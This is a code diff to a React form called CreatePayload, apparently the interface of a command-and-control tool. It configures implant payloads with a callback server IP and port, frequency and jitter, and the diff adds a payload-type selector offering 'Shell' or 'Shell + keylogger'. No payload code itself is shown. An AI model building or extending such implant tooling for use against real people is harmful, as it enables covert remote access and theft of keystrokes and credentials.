@@ -9,6 +9,7 @@ const CreatePayload = () => {
   const [serverport, setServerPort] = useState('');
   const [callbackfrequency, setCallbackfrequency] = useState('');
   const [callbackjitter, setCallbackjitter] = useState('');
+  const [type, setType] = useState('');
 
   const send = async () => {
     var command = {
@@ -17,8 +18,10 @@ const CreatePayload = () => {
       serverip: serverip,
       serverport: serverport,
       callbackfrequency: callbackfrequency,
-      callbackjitter: callbackjitter
+      callbackjitter: callbackjitter,
+      type: type
     }
+    console.log(command)
     var res = await genPayload(command)
     console.log(res.payload)
   }
@@ -261,6 +264,46 @@ const CreatePayload = () => {
                             {/*Start News 1 Title */}
                             {/* {this.props.command} */}
                             <input onChange={e => setCallbackjitter(e.target.value)} type="text" />
+                            {/*End News 1 Title */}
+                        </font>
+                        <font size={2} color="#888888">
+                            {" "}
+                            +{"     "}
+                        </font>
+                        <font size={2} color="#888888">
+                            {/* <font size={2} color="#ff3333">
+                                |
+                            </font> */}
+                            {"\n"}
+                            <font size={2} color="#ff3333">
+                                {" "}
+                                ------------------------------------------------------{" "}
+                            </font>
+                        </font>
+                        <br/>
+                        {/*   end */}
+
+                         {/*   begin */}
+                         <font size={2} color="#ff3333">
+                            {" "}
+                            ______________________________________________________{" "}
+                        </font>
+                        {"\n"}
+                        {/* <font size={2} color="#ff3333">
+                            |
+                        </font> */}
+                        <font size={2} color="#888888">
+                            {" "}
+                        Payload Type
+                            +{" "}
+                        </font>
+                        <font size={2} color="#FFFFFF">
+                            {/*Start News 1 Title */}
+                            {/* {this.props.command} */}
+                            <select onChange={e => setType(e.target.value)}>
+                              <option value="original">Shell</option>
+                              <option value="wkeys">Shell + keylogger</option>
+                            </select>
                             {/*End News 1 Title */}
                         </font>
                         <font size={2} color="#888888">
